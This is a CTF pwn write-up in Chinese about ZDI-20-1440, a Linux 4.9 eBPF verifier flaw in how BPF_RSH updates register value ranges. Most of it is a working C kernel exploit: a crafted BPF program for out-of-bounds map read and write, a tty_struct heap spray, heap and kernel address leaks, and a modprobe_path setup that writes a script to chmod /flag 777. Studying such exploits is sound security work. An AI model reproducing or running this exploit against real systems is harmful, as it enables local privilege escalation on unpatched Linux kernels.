## Pwn

### dayone - ZDI-20-1440

漏洞成因為 verifier 在執行 `adjust_reg_min_max_vals()` 時，如果 opcode 為 `BPF_RSH`，則會根據當前的 `min_val` 與 `max_val`，調整 `dst_reg->min_value` 以及 `dst_reg->max_value`，不過在更新範圍的運算式沒有寫好，導致可能會有 over read/write 的問題 ([src](https://elixir.bootlin.com/linux/v4.9/source/kernel/bpf/verifier.c#L1571)):

```c
	case BPF_RSH:
		/* RSH by a negative number is undefined, and the BPF_RSH is an
		 * unsigned shift, so make the appropriate casts.
		 */
		if (min_val < 0 || dst_reg->min_value < 0)
			dst_reg->min_value = BPF_REGISTER_MIN_RANGE;
		else
			dst_reg->min_value =
				(u64)(dst_reg->min_value) >> min_val;
		if (dst_reg->max_value != BPF_REGISTER_MAX_RANGE)
			dst_reg->max_value >>= max_val;
		break;
```

- 最大值應該要侷限在 `dst_reg->max_value >>= min_val` 以及最小值要侷限在 `dst_reg->min_value >>= max_val` 才 make sense



`adjust_reg_min_max_vals()` 會在 `check_alu_op()` 中被呼叫到，

```c
/* check validity of 32-bit and 64-bit arithmetic operations */
static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)
{
	struct bpf_reg_state *regs = env->cur_state.regs, *dst_reg;
	u8 opcode = BPF_OP(insn->code);
	int err;

	if (opcode == BPF_END || opcode == BPF_NEG) {
		...
	} else {	/* all other ALU ops: and, sub, xor, add, ... */
		dst_reg = &regs[insn->dst_reg];

		/* first we want to adjust our ranges. */
		adjust_reg_min_max_vals(env, insn); // <--- here
        ...    
    	} else if (BPF_CLASS(insn->code) == BPF_ALU64 &&
			   dst_reg->type == UNKNOWN_VALUE && /* 因為 reg->type 是 register，所以不會進來 */
			   env->allow_ptr_leaks) {
			/* unknown += K|X */
			return evaluate_reg_alu(env, insn);
		} else if (BPF_CLASS(insn->code) == BPF_ALU64 &&
			   dst_reg->type == CONST_IMM && /* 因為 reg->type 是 register，所以不會進來 */
			   env->allow_ptr_leaks) {
			/* reg_imm += K|X */
			return evaluate_reg_imm_alu(env, insn);
	    }
	    ...
		if (env->allow_ptr_leaks && /* --- WARNING --- */
		    BPF_CLASS(insn->code) == BPF_ALU64 && opcode == BPF_ADD &&
		    (dst_reg->type == PTR_TO_MAP_VALUE ||
		     dst_reg->type == PTR_TO_MAP_VALUE_ADJ))
			dst_reg->type = PTR_TO_MAP_VALUE_ADJ;
		else
			mark_reg_unknown_value(regs, insn->dst_reg);
    }
    return 0;
}
```

- 但是 `env->allow_ptr_leaks` 必須要為 true，否則在做 add operation 時會被 mark 成 unknown value (`mark_reg_unknown_value(regs, insn->dst_reg);`)



基本上可以透過 `BPF_JGE` 去調整 branch register 所記錄的 max 與 min，並且最後透過 `RSH` 讓 branch register 誤認為某 register 內的值為 `0` (但實際上為可控)，透過 `map_addr` + 該 register 就能 overread/overwrite。



暫時的 exploit，(leak `kern` + `heap`)，是不是只有 `allow_ptr_leaks == true` 的情況下才能 100% leak heap?，嘗試 heap spray `tty_struct` 才能做到一定機率 leak heap，而且都是第一次執行 exploit 才有機會，否則接下來都會是 0:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <math.h>
#include <sys/fcntl.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/bpf.h>
#include "bpf_insn.h"
#define SO_ATTACH_BPF 50
#define LOG_BUF_SIZE 65536

/**
 * r1 = fd
 * r2 = idx
 * [r10-4] = idx
 * r2 = r10
 * r2 -= 4 // idx
 * map_lookup_elem(r1, r2)
 */
#define BPF_GET_MAP(fd, idx) \
        BPF_LD_MAP_FD(BPF_REG_1, fd), \
        BPF_MOV64_IMM(BPF_REG_2, idx), \
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_2, -4), \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \
        BPF_EXIT_INSN()

const uint64_t key = 0;
static char bpf_log_buf[LOG_BUF_SIZE] = {0};
static int ctlmap_fd, expmap_fd, socks[2], prog_fd;

void _log(const char *s, unsigned long val)
{
    char buf[128];
    sprintf(buf, "[*] %s : 0x%016lx", s, val);
    puts(buf);
}

void show(uint64_t *ptr, int num)
{
    puts("----------- show -----------");
    for (int i = 0 ; i < num; i++)
        printf("%d:  0x%016lx \n", i, ptr[i]);
    puts("----------- end -----------\n");
}

int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* REF: https://man7.org/linux/man-pages/man2/bpf.2.html */

/**
 * The BPF_MAP_CREATE command creates a new map, returning a
 * new file descriptor that refers to the map
 */
static inline int
bpf_create_map(enum bpf_map_type map_type,
                unsigned int key_size,
                unsigned int value_size,
                unsigned int max_entries)
{
    union bpf_attr attr = {
        .map_type    = map_type,
        .key_size    = key_size,
        .value_size  = value_size,
        .max_entries = max_entries
    };

    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

/**
 * The BPF_PROG_LOAD command is used to load an eBPF program into
 * the kernel.  The return value for this command is a new file
 * descriptor associated with this eBPF program
 */
static inline int
bpf_prog_load(enum bpf_prog_type type,
                const struct bpf_insn *insns, int insn_cnt,
                const char *license)
{
    union bpf_attr attr = {
        .prog_type = type,
        .insns     = (uint64_t) insns,
        .insn_cnt  = insn_cnt,
        .license   = (uint64_t) license,
        .log_buf   = (uint64_t) bpf_log_buf,
        .log_size  = LOG_BUF_SIZE,
        .log_level = 1,
        .kern_version = 0,
    };
    bpf_log_buf[0] = 0;
    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

/**
 * The BPF_MAP_UPDATE_ELEM command creates or updates an
 * element with a given key/value in the map referred to by
 * the file descriptor fd
 */
static inline int
bpf_update_elem(int fd, const void *key, const void *value,
                uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (uint64_t) key,
        .value  = (uint64_t) value,
        .flags  = flags,
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

/**
 * The BPF_MAP_LOOKUP_ELEM command looks up an element with a
 * given key in the map referred to by the file descriptor
 * fd.
 */
static inline int
bpf_lookup_elem(int fd, const void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (uint64_t) key,
        .value  = (uint64_t) value,
    };

    return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}
struct bpf_insn insns[] = 
{
    BPF_GET_MAP(3, 0), // r0 = ctlmap_fd
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0), /* r8 = [r0] */
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 8), /* r9 = [r0 + 0x8] */
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0x10), /* r3 = [r0 + 0x10], cmd */
    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0x18), /* r1 = [r0 + 0x18], value */
    BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_0, 0x20), /* r5 = [r0 + 0x20], neg */
    
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0), /* r6 = r0, for backup */

    /* --- trigger bug --- */
    BPF_JMP_IMM(BPF_JGE, BPF_REG_8, 0, 1),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JGE, BPF_REG_8, 0x1000, 11),
    /* 0 <= r8 < 0x1000 */

    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, 0, 1),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, 0x400, 8),
    /* 0 <= r9 < 0x400 */
    
    BPF_ALU64_REG(BPF_RSH, BPF_REG_8, BPF_REG_9), /* r8 >>= r9 */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_5, 1, 1), /* check r5 - 1:neg 0:pos */
    BPF_ALU64_IMM(BPF_NEG, BPF_REG_8, 0), /* r8 *= -1 */
    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_8), /* r0 += r8 */
    /* --- trigger bug end --- */
    
    BPF_JMP_IMM(BPF_JNE, BPF_REG_3, 1, 4), /* check r3 - 2:leak heap 1:read 0:write */

    /* ---- read ---- */
    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_0, 0), /* r4 = [r0] */
    BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_4, 0), /* [r6] = r4 */
    BPF_MOV64_REG(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    /* --- leak heap --- */
    BPF_JMP_IMM(BPF_JNE, BPF_REG_3, 2, 3),
    BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_6, 0),  /* [r6] = r6 */
    BPF_MOV64_REG(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    /* ---- write ---- */
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0), /* [r0] = r1 */
    BPF_MOV64_REG(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
};

void setup_modprobe_path()
{
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/qq");
    system("chmod +x /tmp/qq");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
}

void trigger_hook()
{
    char buf[64];
    puts("trigger hook ...");
    syscall(__NR_write, socks[0], buf, sizeof(buf));
}

void init_proc()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    int pfds[0x300];
    
    ctlmap_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1);
    expmap_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1);
    /* heap spray */
    for (int i = 0; i < 0x300; i++) {
        pfds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }

    if (expmap_fd < 0 || ctlmap_fd < 0) {
        perror("[-] create map failed");
        exit(1);
    }
    prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns,
                            sizeof(insns) / sizeof(insns[0]), "GPL");
    if (prog_fd < 0) {
        perror("[-] create prog_fd failed");
        exit(1);
    }
    socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
    assert(setsockopt(socks[1], SOL_SOCKET, SO_ATTACH_BPF,
                        &prog_fd, sizeof(prog_fd)) == 0);
    printf("expmap_fd: %d, ctlmap_fd: %d\n", expmap_fd, ctlmap_fd);
    printf("prog_fd: %d\n", prog_fd);
    printf("socks: %d %d\n", socks[0], socks[1]);
}

void leak_heap(uint64_t *map)
{
    map[0] = 1;
    map[1] = 0;
    map[2] = 2;
    map[3] = 0xdeadbeef; // dummy
    map[4] = 0;
    bpf_update_elem(ctlmap_fd, &key, map, 0);
    trigger_hook();
    bpf_lookup_elem(ctlmap_fd, &key, map);
}

void read_from_map(uint64_t *map, int64_t off)
{
    map[0] = abs(off);
    map[1] = 0;
    map[2] = 1;
    map[3] = 0xdeadbeef; // dummy
    if (off < 0) {
        map[4] = 1;
    } else {
        map[4] = 0;
    }
    bpf_update_elem(ctlmap_fd, &key, map, 0);
    trigger_hook();
    bpf_lookup_elem(ctlmap_fd, &key, map);
}

void write_to_map(uint64_t *map, int64_t off, uint64_t val)
{
    map[0] = abs(off);
    map[1] = 0;
    map[2] = 0;
    map[3] = val;
    if (off < 0) {
        map[4] = 1;
    } else {
        map[4] = 0;
    }
    bpf_update_elem(ctlmap_fd, &key, map, 0);
    trigger_hook();
}

void exploit()
{
    char *map0 = (char *) malloc(0x100);
    char *map1 = (char *) malloc(0x100);
    uint64_t *map0_64 = (uint64_t *) map0;
    uint64_t *map1_64 = (uint64_t *) map1;
    
    /**
     * map0
     * 0: r8 (offset)
     * 1: r9 (fix)
     * 2: r3 (cmd)
     * 3: r1 (value)
     * 4: r5 (neg)
     */
    /* leak kern */
    leak_heap(map0_64);
    show(map0_64, 4);
    uint64_t heap = map0_64[0];
    _log("heap", heap);

    read_from_map(map0_64, -0x90);
    uint64_t kern = map0_64[0] - 0x82e300;
    _log("kern", kern);
}

int main()
{
    init_proc();
    setup_modprobe_path();
    exploit();

    // printf("log:\n%s\n", bpf_log_buf);
    // system("/tmp/dummy");
    // system("cat /flag");
    return 0;
}
```



eBPF 的相關知識補充:

- `check_cfg()` - 檢測 loop-free
- `do_check()` - 檢測 invalid insn 以及 memory violations

參考資料:

- [smallkirby 的文章](https://smallkirby.hatenablog.com/entry/2021/02/20/131428#%E3%81%A8%E3%81%84%E3%81%86%E3%81%8Bpointer-leak%E3%81%8C%E4%BB%BB%E6%84%8F%E3%81%AB%E5%8F%AF%E8%83%BD%E3%81%98%E3%82%83%E3%82%93)
- [hexrabbit 的文章](https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0)